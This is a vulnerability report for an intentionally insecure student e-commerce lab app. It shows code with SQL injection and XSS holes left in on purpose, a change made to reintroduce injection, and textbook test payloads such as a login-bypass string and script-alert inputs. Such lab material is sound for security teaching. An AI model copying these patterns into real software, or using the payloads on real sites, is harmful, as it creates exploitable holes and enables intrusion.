# Vulnerability Analysis Report
## FYP E-commerce Website - Security Testing

This document outlines the vulnerabilities found in the codebase and explains why some might not be working as expected.

---

## üî¥ SQL Injection Vulnerabilities

### 1. **Login API** (`pages/api/login.js` - Line 73)
**Status:** ‚úÖ **WORKING** (Fixed/Verified)

**Vulnerability:**
```javascript
const sql = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
const pool = getDbPool();
const [result] = await pool.query(sql); // Uses pool.query() directly
```

**Why it works:**
- Uses `pool.query()` directly, bypassing the `query()` helper function
- `pool.query()` executes raw SQL without prepared statements
- User input is directly concatenated into the SQL string

**Test Payload:**
```
Username: admin' OR '1'='1
Password: anything
```

**Expected Result:** Should bypass authentication and log in as admin

---

### 2. **Search API - Admin User Search** (`pages/api/search.js` - Line 28)
**Status:** ‚úÖ **FIXED** (Was using `query()` which uses prepared statements)

**Previous Issue:**
- Was calling `query(sql)` which internally uses `pool.execute()`
- `pool.execute()` uses prepared statements, preventing SQL injection

**Fix Applied:**
- Changed to use `pool.query()` directly, just like login.js
- Now properly vulnerable to SQL injection

**Vulnerability:**
```javascript
const sql = `
  SELECT id, username, role, email, created_at
  FROM users
  WHERE username LIKE '%${searchTerm}%'
  ORDER BY created_at DESC
`;
const pool = getDbPool();
const [rows] = await pool.query(sql); // Now uses pool.query() directly
```

**Test Payload:**
```
GET /api/search?q=test' OR '1'='1'--&scope=users
```

**Expected Result:** Should return all users from the database

---

## üü° Cross-Site Scripting (XSS) Vulnerabilities

### 1. **Reflected XSS - Home Page Redirect** (`pages/index.js` - Line 16-39)
**Status:** ‚úÖ **WORKING**

**Vulnerability:**
- Accepts `redirect` query parameter
- Executes JavaScript code if it starts with `javascript:`
- Uses `new Function()` to execute arbitrary code

**Test Payload:**
```
http://localhost:3000/?redirect=javascript:alert('XSS')
```

**Expected Result:** Should execute the alert

**Note:** This is a reflected XSS via URL parameter manipulation.

---

### 2. **Reflected XSS - Search Page** (`pages/search.js` - Lines 91, 98)
**Status:** ‚ö†Ô∏è **POTENTIALLY WORKING** (May need verification)

**Vulnerability:**
```javascript
dangerouslySetInnerHTML={{ __html: highlightedTerm }}
dangerouslySetInnerHTML={{ __html: announcement }}
```

**Where the HTML is built:**
```javascript
const highlightedTerm = useMemo(() => {
  if (!q) return '';
  return `Showing results for <strong>${q}</strong>`; // q is user input
}, [q]);
```

**Test Payload:**
```
/search?q=<img src=x onerror=alert('XSS')>
```

**Expected Result:** Should execute the alert when the image fails to load

**Potential Issues:**
- Next.js might be escaping the query parameter in `getServerSideProps`
- Browser XSS protection might block it
- Try URL encoding: `%3Cimg%20src=x%20onerror=alert('XSS')%3E`

---

### 3. **Stored XSS - Product Reviews** (`pages/product/[id].js` - Line 298)
**Status:** ‚ö†Ô∏è **REQUIRES FLAG** (XSS disabled by default)

**Vulnerability:**
```javascript
{shouldRenderXSS ? (
  <div dangerouslySetInnerHTML={{ __html: review.comment }} />
) : (
  <div>{review.comment}</div>
)}
```

**Why it might not work:**
- Requires `localStorage.setItem('xssEnabled', 'true')` to be set
- Admin can enable it via "Clear & Enable XSS" button
- Or manually set in browser console: `localStorage.setItem('xssEnabled', 'true')`

**Test Steps:**
1. Enable XSS: `localStorage.setItem('xssEnabled', 'true')` in browser console
2. Submit a review with: `<script>alert('XSS')</script>`
3. Reload the page - the script should execute

**Note:** The code has redirect protection to prevent infinite loops.

---

### 4. **DOM-based XSS - Cart Promo Code** (`pages/cart.js` - Line 39)
**Status:** ‚ö†Ô∏è **REQUIRES FLAG** (XSS disabled by default)

**Vulnerability:**
```javascript
if (isXssActive) {
  message.innerHTML = 'Applied: ' + code; // User input directly in innerHTML
}
```

**Why it might not work:**
- Requires `localStorage.setItem('xssEnabled', 'true')` to be set
- Only works when the flag is enabled

**Test Steps:**
1. Enable XSS: `localStorage.setItem('xssEnabled', 'true')` in browser console
2. Go to cart page
3. Enter in promo code: `<img src=x onerror=alert('XSS')>`
4. Click "Apply" button

---

### 5. **DOM-based XSS - Promo Code (Public JS)** (`public/js/promo.js` - Line 17)
**Status:** ‚ö†Ô∏è **MAY NOT BE LOADED**

**Vulnerability:**
```javascript
message.innerHTML = 'Applied: ' + code;
```

**Potential Issues:**
- This file might not be loaded/used in the current implementation
- The cart.js version is the active one

---

## üîç Why Vulnerabilities Might Not Be Working

### SQL Injection Issues:

1. **Using `query()` helper instead of `pool.query()`:**
   - The `query()` function in `lib/db.js` uses `pool.execute()` which uses prepared statements
   - Prepared statements prevent SQL injection
   - **Solution:** Use `pool.query()` directly for vulnerable queries

2. **MySQL Not Available:**
   - If MySQL is not configured, the app falls back to JSON files
   - SQL injection only works when MySQL is connected
   - Check environment variables: `DB_HOST`, `DB_USER`, `DB_PASSWORD`, `DB_NAME`

### XSS Issues:

1. **XSS Protection Flags:**
   - Some XSS vulnerabilities require `xssEnabled` flag in localStorage
   - Set it: `localStorage.setItem('xssEnabled', 'true')`

2. **Next.js Automatic Escaping:**
   - Next.js might escape query parameters in some contexts
   - Use `dangerouslySetInnerHTML` to bypass (already done in code)

3. **Browser XSS Protection:**
   - Modern browsers have XSS filters
   - Try different payloads or disable browser protection for testing

4. **Content Security Policy (CSP):**
   - Check if CSP headers are blocking inline scripts
   - Look for CSP headers in response

---

## ‚úÖ Testing Checklist

### SQL Injection Tests:

- [ ] **Login SQL Injection:**
  - Try: `admin' OR '1'='1` as username
  - Should bypass authentication

- [ ] **Search SQL Injection:**
  - Try: `/api/search?q=test' OR '1'='1'--&scope=users`
  - Should return all users

### XSS Tests:

- [ ] **Reflected XSS - Redirect:**
  - Try: `/?redirect=javascript:alert('XSS')`
  - Should execute alert

- [ ] **Reflected XSS - Search:**
  - Try: `/search?q=<img src=x onerror=alert('XSS')>`
  - Should execute alert

- [ ] **Stored XSS - Reviews:**
  - Enable: `localStorage.setItem('xssEnabled', 'true')`
  - Submit review: `<script>alert('XSS')</script>`
  - Reload page - should execute

- [ ] **DOM XSS - Cart:**
  - Enable: `localStorage.setItem('xssEnabled', 'true')`
  - Enter promo: `<img src=x onerror=alert('XSS')>`
  - Click Apply - should execute

---

## üõ†Ô∏è Environment Setup

Ensure MySQL is configured:
```env
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=yourpassword
DB_NAME=fyp_ecommerce
DB_PORT=3306
```

---

## üìù Notes

- All vulnerabilities are intentionally included for educational purposes
- This is a safe testing environment (localhost/VMware)
- Never deploy this code to production
- Always use parameterized queries and input sanitization in real applications

